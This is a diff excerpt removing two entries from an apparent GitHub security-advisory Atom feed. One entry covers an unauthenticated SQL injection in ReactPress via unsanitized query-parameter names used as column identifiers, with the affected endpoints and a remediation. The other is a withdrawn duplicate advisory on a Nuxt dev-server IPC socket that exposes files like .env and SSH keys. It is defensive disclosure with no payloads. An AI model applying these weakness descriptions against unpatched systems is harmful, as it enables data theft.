-        <title type="html"><![CDATA[[@fecommunity/reactpress] ReactPress has SQL injection via dynamic column names in TypeORM query builders]]></title>
-        <id>https://github.com/advisories/GHSA-wmw4-mw6x-6vfm</id>
-        <link href="https://github.com/advisories/GHSA-wmw4-mw6x-6vfm"/>
-        <updated>2026-09-23T21:52:00.000Z</updated>
-        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
-<p>ReactPress API list endpoints build TypeORM <code>QueryBuilder</code> conditions using
-unsanitized HTTP query parameter <em>names</em> as SQL column identifiers
-(e.g. <code>`article.${key}`</code>). TypeORM parameterizes values but not column
-names, allowing unauthenticated attackers to inject SQL through crafted
-query string keys.</p>
-<h2 id="impact">Impact</h2>
-<p>An unauthenticated remote attacker can perform blind SQL injection against
-the application database, potentially exfiltrating sensitive data (users,
-settings, API keys, article content, etc.).</p>
-<h2 id="affected-endpoints-unauthenticated-get">Affected endpoints (unauthenticated GET)</h2>
-<ul>
-<li><code>GET /api/article</code></li>
-<li><code>GET /api/comment</code></li>
-<li><code>GET /api/file</code></li>
-<li><code>GET /api/page</code></li>
-<li><code>GET /api/Knowledge</code></li>
-</ul>
-<h2 id="affected-code">Affected code</h2>
-<p>Vulnerable pattern in <code>findAll()</code> methods, including but not limited to:</p>
-<ul>
-<li><code>server/src/modules/article/article.service.ts</code></li>
-<li><code>server/src/modules/comment/comment.service.ts</code></li>
-<li><code>server/src/modules/file/file.service.ts</code></li>
-<li><code>server/src/modules/page/page.service.ts</code></li>
-<li><code>server/src/modules/knowledge/knowledge.service.ts</code></li>
-</ul>
-<h2 id="remediation">Remediation</h2>
-<ul>
-<li>Whitelist allowed filter column names before interpolating into SQL.</li>
-<li>Upgrade to <code>@fecommunity/reactpress</code> &gt;= 3.7.0.</li>
-</ul>
-<h2 id="credit">Credit</h2>
-<p>Reported by lsr365400.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/fecommunity/reactpress/security/advisories/GHSA-wmw4-mw6x-6vfm">https://github.com/fecommunity/reactpress/security/advisories/GHSA-wmw4-mw6x-6vfm</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-61685">https://nvd.nist.gov/vuln/detail/CVE-2026-61685</a></li>
-<li><a href="https://github.com/fecommunity/reactpress/commit/78ecb70af1c021455c05fdcbe137212c70e310d6">https://github.com/fecommunity/reactpress/commit/78ecb70af1c021455c05fdcbe137212c70e310d6</a></li>
-<li><a href="https://github.com/fecommunity/reactpress/releases/tag/v3.7.0">https://github.com/fecommunity/reactpress/releases/tag/v3.7.0</a></li>
-<li><a href="https://github.com/advisories/GHSA-wmw4-mw6x-6vfm">https://github.com/advisories/GHSA-wmw4-mw6x-6vfm</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-wmw4-mw6x-6vfm</uri>
-        </author>
-        <category label="severity" term="HIGH"/>
-        <published>2026-09-23T21:51:59.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[nuxt] Duplicate Advisory: Nuxt dev server vite-node IPC socket is world-connectable on Linux]]></title>
-        <id>https://github.com/advisories/GHSA-2x6f-57hp-86fx</id>
-        <link href="https://github.com/advisories/GHSA-2x6f-57hp-86fx"/>
-        <updated>2026-09-23T21:25:47.000Z</updated>
-        <content type="html"><![CDATA[<h3 id="duplicate-advisory">Duplicate Advisory</h3>
-<p>This advisory has been withdrawn because it is a duplicate of GHSA-534h-c3cw-v3h9. This link is maintained to preserve external references.</p>
-<h3 id="original-description">Original Description</h3>
-<p>Nuxt 4.0.0 before 4.4.7 and 3.18.0 before 3.21.7, when running the development server (nuxt dev) on Linux, binds the vite-node IPC server to an abstract-namespace Unix socket without permission restrictions, allowing local users to enumerate and connect. Unprivileged co-resident users can exploit the unprotected module request handler to read arbitrary files such as .env and SSH keys through the SSR plugin pipeline. Production builds are unaffected, as the IPC server runs only in development.</p>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-534h-c3cw-v3h9">https://github.com/nuxt/nuxt/security/advisories/GHSA-534h-c3cw-v3h9</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-56301">https://nvd.nist.gov/vuln/detail/CVE-2026-56301</a></li>
-<li><a href="https://github.com/nuxt/nuxt/commit/1f9f4767a8725104da9bee872bb8d35246f25ae5">https://github.com/nuxt/nuxt/commit/1f9f4767a8725104da9bee872bb8d35246f25ae5</a></li>
-<li><a href="https://github.com/nuxt/nuxt/commit/c293bf9503ccb3bc9559bff4a1f592f99063c9ea">https://github.com/nuxt/nuxt/commit/c293bf9503ccb3bc9559bff4a1f592f99063c9ea</a></li>
-<li><a href="https://www.vulncheck.com/advisories/nuxt-arbitrary-file-read-via-world-connectable-vite-node-ipc-socket-on-linux">https://www.vulncheck.com/advisories/nuxt-arbitrary-file-read-via-world-connectable-vite-node-ipc-socket-on-linux</a></li>
-<li><a href="https://github.com/advisories/GHSA-2x6f-57hp-86fx">https://github.com/advisories/GHSA-2x6f-57hp-86fx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-2x6f-57hp-86fx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-06-23T15:32:36.000Z</published>
     </entry>
 </feed>
